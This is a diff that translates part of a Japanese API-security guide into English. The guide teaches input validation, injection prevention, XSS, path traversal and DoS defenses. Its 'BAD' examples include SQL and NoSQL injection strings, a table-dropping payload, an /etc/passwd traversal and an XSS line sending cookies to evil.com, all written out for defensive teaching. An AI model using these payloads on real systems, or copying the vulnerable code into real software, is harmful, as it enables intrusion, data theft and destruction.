 
-### 6.3 制御文字・Unicode の正規化
+### 6.3 Control Character and Unicode Normalization
 
 ```typescript
-// 制御文字の除去
+// Remove control characters
 function removeControlChars(str: string): string {
-  // ASCII 制御文字を除去（タブ、改行、復帰は許可）
+  // Remove ASCII control characters (tab, newline, carriage return are allowed)
   return str.replace(/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/g, '');
 }
 
-// NULL バイトの除去（パストラバーサル対策）
+// Remove NULL bytes (path traversal countermeasure)
 function removeNullBytes(str: string): string {
   return str.replace(/\0/g, '');
 }
 
-// Unicode 正規化（見た目が同じで異なるバイト列の統一）
+// Unicode normalization (unify strings that look the same but have different byte sequences)
 function normalizeUnicode(str: string): string {
   return str.normalize('NFC');
 }
 
-// 包括的なサニタイゼーション関数
+// Comprehensive sanitization function
 function sanitizeInput(str: string): string {
   return normalizeUnicode(
     removeNullBytes(
@@ -950,16 +952,16 @@ function sanitizeInput(str: string): string {
   );
 }
 
-// Zod での包括的サニタイゼーション
+// Comprehensive sanitization with Zod
 const SafeStringSchema = z.string()
   .max(1000)
   .transform(sanitizeInput);
 ```
 
-### 6.4 ファイルアップロードのバリデーション
+### 6.4 File Upload Validation
 
 ```typescript
-// ファイルアップロードのバリデーション
+// File upload validation
 const FileUploadSchema = z.object({
   filename: z.string()
     .max(255)
@@ -977,9 +979,9 @@ const FileUploadSchema = z.object({
     .max(10 * 1024 * 1024, 'File must be under 10MB'),
 });
 
-// マジックバイトによる MIME タイプ検証
-// ※ Content-Type ヘッダーは偽装可能なため、
-//   ファイルの先頭バイト列で実際の形式を確認する
+// MIME type verification via magic bytes
+// * The Content-Type header can be spoofed, so verify the actual
+//   format by checking the leading bytes of the file
 const MAGIC_BYTES: Record<string, Buffer> = {
   'image/jpeg': Buffer.from([0xFF, 0xD8, 0xFF]),
   'image/png': Buffer.from([0x89, 0x50, 0x4E, 0x47]),
@@ -996,77 +998,77 @@ function verifyMimeType(buffer: Buffer, claimedMime: string): boolean {
 
 ---
 
-## 7. SQL インジェクション対策
+## 7. SQL Injection Prevention
 
-### 7.1 SQL インジェクションの仕組み
+### 7.1 How SQL Injection Works
 
-SQL インジェクションは、ユーザー入力が SQL クエリの一部として解釈されることで発生する脆弱性である。OWASP Top 10 で常に上位に位置し、データ漏洩・改ざん・削除など壊滅的な被害をもたらす。
+SQL injection is a vulnerability that occurs when user input is interpreted as part of a SQL query. It consistently ranks at the top of the OWASP Top 10 and can cause devastating damage such as data leakage, tampering, and deletion.
 
 ```
 +================================================================+
-|              SQL インジェクション攻撃の流れ                       |
+|              SQL Injection Attack Flow                         |
 +================================================================+
 |                                                                |
-|  [正常なリクエスト]                                              |
+|  [Normal Request]                                              |
 |  POST /api/login                                               |
 |  { "email": "taro@example.com", "password": "secret123" }      |
 |                                                                |
-|  生成されるSQL（文字列結合の場合 = 危険）:                        |
+|  Generated SQL (with string concatenation = DANGEROUS):        |
 |  SELECT * FROM users                                           |
 |    WHERE email = 'taro@example.com'                            |
 |      AND password = 'secret123'                                |
 |                                                                |
 |  ─────────────────────────────────────                         |
 |                                                                |
-|  [攻撃リクエスト]                                               |
+|  [Attack Request]                                              |
 |  POST /api/login                                               |
 |  { "email": "' OR '1'='1' --", "password": "anything" }       |
 |                                                                |
-|  生成されるSQL:                                                 |
+|  Generated SQL:                                                |
 |  SELECT * FROM users                                           |
 |    WHERE email = '' OR '1'='1' --'                             |
 |      AND password = 'anything'                                 |
 |                                                                |
-|  解釈: WHERE (email='') OR ('1'='1')                           |
-|  結果: 全レコードが返される（認証バイパス）                        |
+|  Interpretation: WHERE (email='') OR ('1'='1')                 |
+|  Result: All records are returned (authentication bypass)      |
 |                                                                |
 |  ─────────────────────────────────────                         |
 |                                                                |
-|  [破壊的攻撃]                                                   |
+|  [Destructive Attack]                                          |
 |  { "email": "'; DROP TABLE users; --" }                        |
 |                                                                |
-|  生成されるSQL:                                                 |
+|  Generated SQL:                                                |
 |  SELECT * FROM users                                           |
 |    WHERE email = ''; DROP TABLE users; --'                     |
 |                                                                |
-|  結果: users テーブルが削除される                                |
+|  Result: The users table is deleted                            |
 |                                                                |
 +================================================================+
 ```
 
-### 7.2 パラメタライズドクエリ（プリペアドステートメント）
+### 7.2 Parameterized Queries (Prepared Statements)
 
-SQL インジェクション対策の基本中の基本は、パラメタライズドクエリ（プリペアドステートメント）の使用である。これにより、ユーザー入力は常に「データ」として扱われ、SQL 構文として解釈されることがなくなる。
+The fundamental countermeasure against SQL injection is to use parameterized queries (prepared statements). This ensures that user input is always treated as "data" and is never interpreted as SQL syntax.
 
 ```typescript
 // ============================================================
-// コード例6: パラメタライズドクエリの各種実装
+// Code Example 6: Various Implementations of Parameterized Queries
 // ============================================================
 
-// --- pg（PostgreSQL） ---
+// --- pg (PostgreSQL) ---
 import { Pool } from 'pg';
 const pool = new Pool();
 
-// NG: 文字列結合（絶対にやってはならない）
+// BAD: String concatenation (never do this)
 async function findUserBad(email: string) {
-  // !! 脆弱 !!
+  // !! VULNERABLE !!
   const result = await pool.query(
     `SELECT * FROM users WHERE email = '${email}'`
   );
   return result.rows[0];
 }
 
-// OK: パラメタライズドクエリ
+// GOOD: Parameterized query
 async function findUserGood(email: string) {
   const result = await pool.query(
     'SELECT * FROM users WHERE email = $1',
@@ -1075,7 +1077,7 @@ async function findUserGood(email: string) {
   return result.rows[0];
 }
 
-// OK: 複数パラメータ
+// GOOD: Multiple parameters
 async function searchUsers(name: string, role: string, limit: number) {
   const result = await pool.query(
     `SELECT id, name, email, role FROM users
@@ -1099,32 +1101,32 @@ async function findUserMySQL(email: string) {
 }
 
 // --- Prisma ORM ---
-// Prisma は内部的にパラメタライズドクエリを使用するため、
-// 通常の API 使用では SQL インジェクションは発生しない
+// Prisma uses parameterized queries internally, so
+// normal API usage does not result in SQL injection
 async function findUserPrisma(email: string) {
   return prisma.user.findUnique({
-    where: { email },  // 自動的にパラメータバインドされる
+    where: { email },  // Automatically parameter-bound
   });
 }
 
-// ただし Prisma.$queryRaw を使う場合は注意が必要
-// NG:
+// Caution is needed when using Prisma.$queryRaw
+// BAD:
 const resultBad = await prisma.$queryRawUnsafe(
   `SELECT * FROM users WHERE email = '${email}'`
 );
 
-// OK: テンプレートリテラルを使用（Prisma が自動パラメータ化）
+// GOOD: Use template literals (Prisma auto-parameterizes)
 const resultGood = await prisma.$queryRaw`
   SELECT * FROM users WHERE email = ${email}
 `;
 
 // --- Knex.js ---
-// Knex のクエリビルダは自動的にパラメータバインドを行う
+// Knex's query builder automatically handles parameter binding
 async function findUserKnex(email: string) {
   return knex('users').where({ email }).first();
 }
 
-// whereRaw を使う場合はバインディングを明示
+// When using whereRaw, specify bindings explicitly
 async function searchUserKnex(name: string) {
   return knex('users')
     .whereRaw('name ILIKE ?', [`%${name}%`])
@@ -1132,12 +1134,12 @@ async function searchUserKnex(name: string) {
 }
 ```
 
-### 7.3 動的クエリの安全な構築
+### 7.3 Safely Building Dynamic Queries
 
-検索機能など、条件が動的に変化するクエリでは、クエリビルダーパターンを使って安全に構築する。
+For features like search where conditions change dynamically, use the query builder pattern to construct queries safely.
 
 ```typescript
-// 動的検索クエリの安全な構築
+// Safe construction of dynamic search queries
 interface UserSearchParams {
   name?: string;
   email?: string;
@@ -1150,7 +1152,7 @@ interface UserSearchParams {
   perPage?: number;
 }
 
-// Zod でパラメータを事前検証
+// Pre-validate parameters with Zod
 const UserSearchParamsSchema = z.object({
   name: z.string().max(100).optional(),
   email: z.string().email().optional(),
@@ -1171,7 +1173,7 @@ const UserSearchParamsSchema = z.object({
   { message: 'minAge must be <= maxAge' }
 );
 
-// 安全な動的クエリビルダ
+// Safe dynamic query builder
 async function searchUsers(params: UserSearchParams) {
   const conditions: string[] = [];
   const values: any[] = [];
@@ -1206,8 +1208,8 @@ async function searchUsers(params: UserSearchParams) {
     ? `WHERE ${conditions.join(' AND ')}`
     : '';
 
-  // sortBy は enum で検証済みのためホワイトリストに含まれる値のみ
-  // -> 直接SQL文に埋め込んでも安全
+  // sortBy has been validated against an enum and only contains whitelisted values
+  // -> safe to embed directly in the SQL string
   const allowedSortColumns = ['name', 'email', 'created_at'];
   const sortColumn = allowedSortColumns.includes(params.sortBy || '')
     ? params.sortBy
@@ -1230,33 +1232,33 @@ async function searchUsers(params: UserSearchParams) {
 }
 ```
 
-### 7.4 NoSQL インジェクション
+### 7.4 NoSQL Injection
 
-MongoDB などの NoSQL データベースでも、インジェクション攻撃は発生し得る。
+Injection attacks can also occur in NoSQL databases such as MongoDB.
 
 ```typescript
-// MongoDB NoSQL インジェクションの例
+// Example of MongoDB NoSQL injection
 
-// NG: ユーザー入力を直接クエリに使用
+// BAD: Use user input directly in the query
 app.post('/api/login', async (req, res) => {
   const { email, password } = req.body;
-  // email が { "$gt": "" } のようなオブジェクトの場合、
-  // 全レコードにマッチしてしまう
+  // If email is an object like { "$gt": "" },
+  // it will match all records
   const user = await db.collection('users').findOne({
     email,
     password,
   });
 });
 
-// 攻撃ペイロード:
+// Attack payload:
 // { "email": { "$gt": "" }, "password": { "$gt": "" } }
-// -> 全レコードにマッチ（認証バイパス）
+// -> Matches all records (authentication bypass)
 
-// OK: 型チェックで防御
+// GOOD: Defend with type checking
 app.post('/api/login', async (req, res) => {
   const schema = z.object({
-    email: z.string().email(),   // string 型を強制
-    password: z.string().min(1), // string 型を強制
+    email: z.string().email(),   // Enforce string type
+    password: z.string().min(1), // Enforce string type
   });
 
   const result = schema.safeParse(req.body);
@@ -1264,57 +1266,57 @@ app.post('/api/login', async (req, res) => {
     return res.status(422).json({ errors: result.error.issues });
   }
 
-  // バリデーション済みのため、必ず string 型が保証される
+  // string type is guaranteed because of validation
   const user = await db.collection('users').findOne({
     email: result.data.email,
-    // パスワードは平文比較ではなく bcrypt.compare を使用すべき
+    // Password should be compared with bcrypt.compare, not plain text
   });
 });
 ```
 
 ---
 
-## 8. 一般的な攻撃への防御
+## 8. Defense Against Common Attacks
 
-### 8.1 XSS（クロスサイトスクリプティング）
+### 8.1 XSS (Cross-Site Scripting)
 
 ```typescript
-// XSS 攻撃の種類と防御
+// XSS attack types and defenses
 
-// 1. Reflected XSS: URL パラメータの値がそのままHTMLに埋め込まれる
-//    攻撃: GET /search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>
+// 1. Reflected XSS: URL parameter value is embedded directly into HTML
+//    Attack: GET /search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>
 
-// 2. Stored XSS: 保存されたデータがそのままHTMLに描画される
-//    攻撃: プロフィールの名前に <script>alert('XSS')</script> を登録
+// 2. Stored XSS: Saved data is rendered directly into HTML
+//    Attack: Register <script>alert('XSS')</script> as a profile name
 
-// 3. DOM-based XSS: クライアントサイドJSが安全でないデータ操作を行う
-//    攻撃: innerHTML に未エスケープのユーザー入力を代入
+// 3. DOM-based XSS: Client-side JS performs unsafe data manipulation
+//    Attack: Assign unescaped user input to innerHTML
 
-// --- 防御策 ---
+// --- Defenses ---
 
-// ① API レスポンスヘッダーの設定
+// 1. Set API response headers
 app.use((req, res, next) => {
-  // Content-Type を明示（ブラウザの MIME スニッフィングを防止）
+  // Explicitly set Content-Type (prevent browser MIME sniffing)
   res.setHeader('X-Content-Type-Options', 'nosniff');
 
-  // CSP（Content Security Policy）
+  // CSP (Content Security Policy)
   res.setHeader('Content-Security-Policy',
     "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'"
   );
 
-  // X-XSS-Protection（レガシーブラウザ向け）
+  // X-XSS-Protection (for legacy browsers)
   res.setHeader('X-XSS-Protection', '1; mode=block');
 
   next();
 });
 
-// ② JSON API では Content-Type: application/json を返す
-//    ブラウザは JSON を HTML として解釈しないため XSS リスクが低減
+// 2. JSON APIs return Content-Type: application/json
+//    Browsers don't interpret JSON as HTML, reducing XSS risk
 app.get('/api/users', (req, res) => {
-  res.json({ data: users }); // Content-Type: application/json が自動設定
+  res.json({ data: users }); // Content-Type: application/json is automatically set
 });
 
-// ③ 入力のバリデーションとサニタイゼーション
+// 3. Input validation and sanitization
 const UserProfileSchema = z.object({
   displayName: z.string()
     .min(1)
@@ -1328,19 +1330,19 @@ const UserProfileSchema = z.object({
 });
 ```
 
-### 8.2 Mass Assignment（一括代入攻撃）
+### 8.2 Mass Assignment Attack
 
 ```typescript
-// Mass Assignment 攻撃の例と防御
+// Mass Assignment attack example and defense
 
-// 攻撃シナリオ:
+// Attack scenario:
 // PUT /api/users/me
 // { "name": "Taro", "email": "taro@example.com", "role": "admin", "isVerified": true }
-// -> role と isVerified は本来ユーザーが変更できないフィールド
+// -> role and isVerified are fields that users should not be able to modify
 
-// --- 防御策1: Zod の strict() + pick() ---
+// --- Defense 1: Zod strict() + pick() ---
 
-// 全フィールドを含む基本スキーマ
+// Base schema with all fields
 const UserBaseSchema = z.object({
   name: z.string().min(1).max(100),
   email: z.string().email(),
@@ -1350,25 +1352,25 @@ const UserBaseSchema = z.object({
   avatar: z.string().url().optional(),
 });
 
-// ユーザー自身が更新可能なフィールドのみ抽出
+// Extract only fields that the user can update themselves
 const UserSelfUpdateSchema = UserBaseSchema
   .pick({
     name: true,
     bio: true,
     avatar: true,
   })
-  .strict(); // 未定義フィールドがあればエラー
+  .strict(); // Error if there are undefined fields
 
-// 管理者が更新可能なフィールド
+// Fields that administrators can update
 const UserAdminUpdateSchema = UserBaseSchema
-  .partial()  // 全フィールドを optional に
+  .partial()  // Make all fields optional
   .strict();
 
-// --- 防御策2: class-validator の whitelist ---
-// NestJS の ValidationPipe で自動的に未定義フィールドを除去
+// --- Defense 2: class-validator whitelist ---
+// NestJS ValidationPipe automatically removes undefined fields
 // new ValidationPipe({ whitelist: true, forbidNonWhitelisted: true })
 
-// --- 防御策3: 明示的なフィールド選択 ---
+// --- Defense 3: Explicit field selection ---
 function pickAllowedFields<T extends Record<string, any>>(
   data: T,
   allowedFields: (keyof T)[]
@@ -1382,44 +1384,44 @@ function pickAllowedFields<T extends Record<string, any>>(
   return result;
 }
 
-// 使用例
+// Usage example
 app.put('/api/users/me', async (req, res) => {
   const safeData = pickAllowedFields(req.body, ['name', 'bio', 'avatar']);
   await userService.update(req.user.id, safeData);
 });
 ```
 
-### 8.3 ReDoS（正規表現 DoS）
+### 8.3 ReDoS (Regular Expression DoS)
 
 ```typescript
-// ReDoS 攻撃: 悪意のある入力で正規表現のバックトラッキングが爆発する
+// ReDoS attack: regex backtracking explodes with malicious input
 
-// NG: 脆弱な正規表現
+// BAD: Vulnerable regular expression
 const emailRegexBad = /^([a-zA-Z0-9]+\.)*[a-zA-Z0-9]+@([a-zA-Z0-9]+\.)+[a-zA-Z]{2,}$/;
-// "aaaaaaaaaaaaaaaaaaaaaaaaa!" のような入力で指数的にバックトラックする
+// Input like "aaaaaaaaaaaaaaaaaaaaaaaaa!" causes exponential backtracking
 
-// OK: 安全な正規表現の書き方
-// 1. 入力長を先に制限する
+// GOOD: Writing safe regular expressions
+// 1. Limit input length first
 const safeEmailCheck = (input: string): boolean => {
   if (input.length > 254) return false; // RFC 5321
   return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(input);
 };
 
-// 2. 組み込みのバリデータを使用する（Zod, Joi の email()）
-//    これらは ReDoS 耐性のある実装を使用している
+// 2. Use built-in validators (Zod, Joi's email())
+//    These use ReDoS-resistant implementations
 
-// 3. 正規表現の複雑度を制限する
-//    - ネストした量指定子を避ける: (a+)+ -> a+
-//    - 重複する文字クラスを避ける: [a-zA-Z0-9]*[a-z]* -> [a-zA-Z0-9]*
-//    - 固定長のアンカーを使用する: ^...$
+// 3. Limit regex complexity
+//    - Avoid nested quantifiers: (a+)+ -> a+
+//    - Avoid overlapping character classes: [a-zA-Z0-9]*[a-z]* -> [a-zA-Z0-9]*
+//    - Use fixed-length anchors: ^...$
 
-// 4. タイムアウトを設定する（Node.js の場合）
+// 4. Set a timeout (for Node.js)
 function safeRegexTest(
   pattern: RegExp,
   input: string,
   timeoutMs: number = 100
 ): boolean {
-  // 入力長の制限を先に適用
+  // Apply input length limit first
   if (input.length > 10000) return false;
 
   const start = performance.now();
@@ -1434,24 +1436,24 @@ function safeRegexTest(
 }
 ```
 
-### 8.4 パストラバーサル
+### 8.4 Path Traversal
 
 ```typescript
-// パストラバーサル攻撃: ファイルパスを操作してアクセス制御を回避する
+// Path traversal attack: manipulate file paths to bypass access controls
 
-// 攻撃例:
+// Attack examples:
 // GET /api/files/../../etc/passwd
-// GET /api/files/..%2F..%2Fetc%2Fpasswd  (URL エンコード)
+// GET /api/files/..%2F..%2Fetc%2Fpasswd  (URL encoded)
 
 import path from 'path';
 
-// NG: パス検証なし
+// BAD: No path validation
 app.get('/api/files/:filename', (req, res) => {
   const filePath = path.join('/uploads', req.params.filename);
-  res.sendFile(filePath); // ../../etc/passwd にアクセス可能
+  res.sendFile(filePath); // ../../etc/passwd is accessible
 });
 
-// OK: 安全なファイルアクセス
+// GOOD: Safe file access
 const UPLOAD_DIR = '/app/uploads';
 
 const FilenameSchema = z.string()
@@ -1475,7 +1477,7 @@ app.get('/api/files/:filename', (req, res) => {
 
   const filePath = path.resolve(UPLOAD_DIR, result.data);
 
-  // ベースディレクトリ内に収まっているか確認
+  // Verify the path stays within the base directory
   if (!filePath.startsWith(UPLOAD_DIR)) {
     return res.status(403).json({ error: 'Access denied' });
   }
@@ -1484,25 +1486,25 @@ app.get('/api/files/:filename', (req, res) => {
 });
 ```
 
-### 8.5 JSON ペイロード攻撃
+### 8.5 JSON Payload Attacks
 
 ```typescript
-// JSON ペイロード攻撃: 巨大 or 深くネストした JSON で DoS を引き起こす
+// JSON payload attack: cause DoS with massive or deeply nested JSON
 
-// 攻撃例:
-// 1. 巨大ペイロード: 数百 MB の JSON
-// 2. 深いネスト: { "a": { "b": { "c": { ... 10000段 ... } } } }
-// 3. 大量のキー: { "key1": 1, "key2": 2, ..., "key1000000": 1000000 }
+// Attack examples:
+// 1. Huge payload: hundreds of MB of JSON
+// 2. Deep nesting: { "a": { "b": { "c": { ... 10000 levels ... } } } }
+// 3. Large number of keys: { "key1": 1, "key2": 2, ..., "key1000000": 1000000 }
 
-// --- 防御策 ---
+// --- Defenses ---
 
-// ① ボディサイズ制限
+// 1. Limit body size
 import express from 'express';
 app.use(express.json({
-  limit: '1mb',  // 1MB を超えるリクエストを拒否
+  limit: '1mb',  // Reject requests exceeding 1MB
 }));
 
-// ② ネスト深度の制限（カスタムミドルウェア）
+// 2. Limit nesting depth (custom middleware)
 function checkNestingDepth(obj: any, maxDepth: number, currentDepth: number = 0): boolean {
   if (currentDepth > maxDepth) return false;
   if (typeof obj !== 'object' || obj === null) return true;
@@ -1524,7 +1526,7 @@ app.use((req, res, next) => {
   next();
 });
 
-// ③ オブジェクトキー数の制限
+// 3. Limit object key count
 function checkKeyCount(obj: any, maxKeys: number): boolean {
   if (typeof obj !== 'object' || obj === null) return true;
   if (Object.keys(obj).length > maxKeys) return false;
@@ -1535,46 +1537,46 @@ function checkKeyCount(obj: any, maxKeys: number): boolean {
   return true;
 }
 
-// ④ 配列サイズの制限（Zod で宣言的に）
+// 4. Limit array size (declaratively with Zod)
 const OrderSchema = z.object({
   items: z.array(
     z.object({
       productId: z.string().uuid(),
       quantity: z.number().int().min(1).max(999),
     })
-  ).min(1).max(100), // 最大100アイテム
+  ).min(1).max(100), // Maximum 100 items
   memo: z.string().max(500).optional(),
 });
 ```
 
 ---
 
-## 9. バリデーションエラーレスポンス設計
+## 9. Validation Error Response Design
 
-### 9.1 RFC 7807 準拠のエラーレスポンス
+### 9.1 RFC 7807-Compliant Error Responses
 
-API のエラーレスポンスは一貫した形式で返すべきである。RFC 7807（Problem Details for HTTP APIs）は、HTTP API のエラーレスポンスの標準形式を定義している。
+API error responses should be returned in a consistent format. RFC 7807 (Problem Details for HTTP APIs) defines the standard format for HTTP API error responses.
 
 ```typescript
-// RFC 7807 準拠のエラーレスポンス型定義
+// RFC 7807-compliant error response type definition
 interface ProblemDetails {
-  type: string;      // エラー種別のURI（ドキュメントURL）
-  title: string;     // 人間可読なエラー概要
-  status: number;    // HTTP ステータスコード
-  detail?: string;   // この特定のエラーの詳細説明
-  instance?: string; // このエラーが発生した具体的なURI
+  type: string;      // URI for error type (documentation URL)
+  title: string;     // Human-readable error summary
+  status: number;    // HTTP status code
+  detail?: string;   // Detailed description of this specific error
+  instance?: string; // The specific URI at which this error occurred
 }
 
 interface ValidationProblemDetails extends ProblemDetails {
   errors: Array<{
-    field: string;      // エラーが発生したフィールド名
-    code: string;       // 機械可読なエラーコード
-    message: string;    // 人間可読なエラーメッセージ
-    rejected?: unknown; // 拒否された値（デバッグ用、本番では省略可）
+    field: string;      // Name of the field where the error occurred
+    code: string;       // Machine-readable error code
+    message: string;    // Human-readable error message
+    rejected?: unknown; // Rejected value (for debugging; may be omitted in production)
   }>;
 }
 
-// バリデーションエラーレスポンスの例
+// Example validation error response
 // HTTP/1.1 422 Unprocessable Entity
 // Content-Type: application/problem+json
 //
@@ -1604,7 +1606,7 @@ interface ValidationProblemDetails extends ProblemDetails {
 //   "requestId": "req_abc123"
 // }
 
-// 統一エラーハンドラ
+// Unified error handler
 function createValidationErrorResponse(
   errors: Array<{ field: string; code: string; message: string }>,
   requestPath: string,
@@ -1622,25 +1624,25 @@ function createValidationErrorResponse(
 }
 ```
 
-### 9.2 ステータスコードの使い分け
+### 9.2 Status Code Usage Guide
 
-| ステータスコード | 用途 | 使用場面 |
-|----------------|------|---------|
-| 400 Bad Request | リクエスト構文エラー | JSON パースエラー、Content-Type 不正 |
-| 401 Unauthorized | 認証エラー | トークン未送信、トークン期限切れ |
-| 403 Forbidden | 認可エラー | 権限不足 |
-| 404 Not Found | リソース不在 | 指定IDのリソースが存在しない |
-| 409 Conflict | 競合 | メールアドレスの重複 |
-| 413 Payload Too Large | ペイロード過大 | ボディサイズ超過 |
-| 422 Unprocessable Entity | バリデーションエラー | フィールド値の不正 |
-| 429 Too Many Requests | レート制限 | API 呼び出し回数超過 |
+| Status Code | Purpose | Usage Scenario |
+|-------------|---------|----------------|
+| 400 Bad Request | Request syntax error | JSON parse error, invalid Content-Type |
+| 401 Unauthorized | Authentication error | Token not sent, token expired |
+| 403 Forbidden | Authorization error | Insufficient permissions |
+| 404 Not Found | Resource not found | Resource with specified ID does not exist |
+| 409 Conflict | Conflict | Duplicate email address |
+| 413 Payload Too Large | Payload too large | Body size exceeded |
+| 422 Unprocessable Entity | Validation error | Invalid field value |
+| 429 Too Many Requests | Rate limiting | API call count exceeded |
 
-### 9.3 エラーメッセージの国際化（i18n）
+### 9.3 Internationalization (i18n) of Error Messages
 
 ```typescript
-// バリデーションエラーメッセージの国際化対応
+// Internationalization of validation error messages
 
-// エラーコードとメッセージの分離
+// Separate error codes and messages
 const ERROR_MESSAGES: Record<string, Record<string, string>> = {
   ja: {
     'validation.required': '{field}は必須です',
@@ -1679,7 +1681,7 @@ function getErrorMessage(
   return message;
 }
 
-// Accept-Language ヘッダーに基づくロケール決定
+// Determine locale based on Accept-Language header
 function getLocaleFromRequest(req: Request): string {
   const acceptLanguage = req.headers['accept-language'] || 'en';
   const preferred = acceptLanguage.split(',')[0].split('-')[0].toLowerCase();
@@ -1689,87 +1691,87 @@ function getLocaleFromRequest(req: Request): string {
 
 ---
 
-## 10. アンチパターン集
+## 10. Anti-Pattern Catalog
 
-### 10.1 アンチパターン1: クライアントサイドバリデーションのみに依存
+### 10.1 Anti-Pattern 1: Relying Solely on Client-Side Validation
 
 ```
 +================================================================+
-|  アンチパターン: クライアント側のみでバリデーション                  |
+|  Anti-Pattern: Validation Only on the Client Side              |
 +================================================================+
 |                                                                |
-|  [誤った設計]                                                   |
+|  [Incorrect Design]                                            |
 |                                                                |
-|  ブラウザ                          サーバー                      |
+|  Browser                            Server                     |
 |  +--------------------+           +--------------------+       |
-|  | フォームバリデーション |   ──>    | バリデーションなし    |       |
-|  | (JavaScript)       |           | 即座にDB保存         |       |
+|  | Form Validation    |   ──>    | No Validation      |       |
+|  | (JavaScript)       |           | Save to DB directly|       |
 |  +--------------------+           +--------------------+       |
 |                                                                |
-|  問題:                                                          |
-|  ・curl / Postman で直接リクエストを送信すればバイパス可能          |
-|  ・ブラウザの開発者ツールで JavaScript を無効化できる               |
-|  ・API は常にブラウザ経由でアクセスされるとは限らない                |
-|  ・モバイルアプリ、外部システム、bot からのアクセスもある            |
+|  Problems:                                                     |
+|  · Can be bypassed by sending requests directly via curl/Postman|
+|  · JavaScript can be disabled in the browser developer tools   |
+|  · The API is not always accessed through a browser            |
+|  · Access also comes from mobile apps, external systems, bots  |
 |                                                                |
 |  ─────────────────────────────────────────────────             |
 |                                                                |
-|  [正しい設計]                                                   |
+|  [Correct Design]                                              |
 |                                                                |
-|  ブラウザ                          サーバー                      |
+|  Browser                            Server                     |
 |  +--------------------+           +--------------------+       |
-|  | フォームバリデーション | ──>      | サーバーサイド        |       |
-|  | (UX向上が目的)      |           | バリデーション        |       |
-|  +--------------------+           | (セキュリティが目的)   |       |
+|  | Form Validation    | ──>      | Server-Side        |       |
+|  | (for UX only)      |           | Validation         |       |
+|  +--------------------+           | (for security)     |       |
 |                                   +--------------------+       |
 |                                                                |
-|  クライアント側: UX のためのフィードバック（必須ではない）           |
-|  サーバー側:   セキュリティのための検証（必須）                     |
+|  Client-side: Feedback for UX (not mandatory)                  |
+|  Server-side: Verification for security (mandatory)            |
 |                                                                |
 +================================================================+
 ```
 
-なぜ危険なのか:
-- 攻撃者は HTTP クライアント（curl、Burp Suite 等）を使って、クライアントサイドのバリデーションを完全にバイパスできる
-- JavaScript を無効化したブラウザからのアクセスではバリデーションが実行されない
-- クライアントサイドのコードは改ざん可能であり、信頼できない
+Why it is dangerous:
+- Attackers can completely bypass client-side validation using HTTP clients (curl, Burp Suite, etc.)
+- Validation is not executed when accessed from a browser with JavaScript disabled
+- Client-side code can be tampered with and is not trustworthy
 
-正しいアプローチ:
-- サーバーサイドでのバリデーションを「必須」とする
-- クライアントサイドのバリデーションは UX 改善のための「付加価値」として位置づける
-- 両方で同じバリデーションルールを適用する場合、Zod スキーマを共有する（monorepo での共有モジュール等）
+The correct approach:
+- Treat server-side validation as "mandatory"
+- Treat client-side validation as "added value" for UX improvement
+- If applying the same validation rules on both sides, share the Zod schema (e.g., as a shared module in a monorepo)
 
-### 10.2 アンチパターン2: ブラックリストベースのバリデーション
+### 10.2 Anti-Pattern 2: Blacklist-Based Validation
 
 ```typescript
-// NG: ブラックリスト（禁止パターンの列挙）
+// BAD: Blacklist (enumerating prohibited patterns)
 function sanitizeInputBad(input: string): string {
-  // 既知の攻撃パターンを除去する方式
+  // Approach of removing known attack patterns
   let sanitized = input;
   sanitized = sanitized.replace(/<script>/gi, '');
   sanitized = sanitized.replace(/<\/script>/gi, '');
   sanitized = sanitized.replace(/javascript:/gi, '');
-  sanitized = sanitized.replace(/on\w+=/gi, '');     // onclick=, onerror= 等
+  sanitized = sanitized.replace(/on\w+=/gi, '');     // onclick=, onerror=, etc.
   sanitized = sanitized.replace(/eval\(/gi, '');
   sanitized = sanitized.replace(/document\./gi, '');
   return sanitized;
 }
-// 問題点:
-// 1. バイパス可能: <scr<script>ipt> -> <script> （除去後に攻撃文字列が復元）
-// 2. エンコーディングバイパス: &#60;script&#62; (HTML エンティティ)
-// 3. 大文字小文字の混在: <ScRiPt>
-// 4. Unicode バイパス: ＜script＞ (全角文字)
-// 5. 新しい攻撃ベクトルへの対応が遅れる
+// Problems:
+// 1. Can be bypassed: <scr<script>ipt> -> <script> (attack string reconstructed after removal)
+// 2. Encoding bypass: &#60;script&#62; (HTML entities)
+// 3. Mixed case: <ScRiPt>
+// 4. Unicode bypass: ＜script＞ (full-width characters)
+// 5. Slow to respond to new attack vectors
 
-// OK: ホワイトリスト（許可パターンの明示）
+// GOOD: Whitelist (explicitly defining allowed patterns)
 const SafeUsernameSchema = z.string()
   .min(3)
   .max(30)
   .regex(/^[a-zA-Z0-9_-]+$/, 'Username must contain only letters, numbers, _ and -');
-// 許可する文字を明示的に定義しているため、
-// どのような攻撃パターンも入力できない
+// By explicitly defining allowed characters,
+// no attack pattern can be entered
 
-// OK: コンテキストに応じた出力エスケープ
+// GOOD: Context-appropriate output escaping
 function renderUserName(name: string, context: 'html' | 'url' | 'json'): string {
   switch (context) {
     case 'html':
@@ -1784,10 +1786,10 @@ function renderUserName(name: string, context: 'html' | 'url' | 'json'): string 
 }
 ```
 
-### 10.3 アンチパターン3: エラーメッセージでの情報漏洩
+### 10.3 Anti-Pattern 3: Information Leakage in Error Messages
 
 ```typescript
-// NG: 内部実装の詳細を露出するエラーメッセージ
+// BAD: Error messages that expose internal implementation details
 app.post('/api/login', async (req, res) => {
   try {
     const user = await db.query(
@@ -1796,7 +1798,7 @@ app.post('/api/login', async (req, res) => {
     );
 
     if (!user) {
-      // NG: メールアドレスの登録状況が判明する
+      // BAD: Reveals whether the email address is registered
       return res.status(404).json({
         error: 'User with this email does not exist',
       });
@@ -1804,13 +1806,13 @@ app.post('/api/login', async (req, res) => {
 
     const valid = await bcrypt.compare(req.body.password, user.password);
     if (!valid) {
-      // NG: パスワードが間違っていることが判明する
+      // BAD: Reveals that the password is wrong
       return res.status(401).json({
         error: 'Incorrect password',
       });
     }
   } catch (err) {
-    // NG: スタックトレースを露出
+    // BAD: Exposes stack trace
     return res.status(500).json({
       error: err.message,
       stack: err.stack,
@@ -1819,7 +1821,7 @@ app.post('/api/login', async (req, res) => {
   }
 });
 
-// OK: 安全なエラーメッセージ
+// GOOD: Safe error messages
 app.post('/api/login', async (req, res) => {
   try {
     const user = await db.query(
@@ -1830,7 +1832,7 @@ app.post('/api/login', async (req, res) => {
